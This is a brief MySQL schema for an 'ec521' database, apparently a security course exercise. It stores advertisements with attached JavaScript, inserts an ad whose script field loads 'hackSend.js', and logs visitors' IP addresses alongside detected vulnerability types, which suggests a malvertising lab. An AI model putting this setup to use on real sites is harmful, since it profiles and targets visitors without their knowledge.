create database ec521;

use ec521;

create table advertisement (
  advertisement_id INT(5)    AUTO_INCREMENT    PRIMARY KEY,
  advertisement_url    VARCHAR(255)    NOT NULL,
  advertisement_image    VARCHAR(255),
  advertisement_js        TEXT
);


create table vuln_log
(
ip_addr  VARCHAR(25) not null,
vuln_type  VARCHAR(255) not null,
vuln_print LONGTEXT
);


alter table vuln_log
add primary key (ip_addr,vuln_type);


insert into advertisement
(advertisement_url,advertisement_image,advertisement_js)
values
('google.com','ec521.gif','<script src="hackSend.js" />');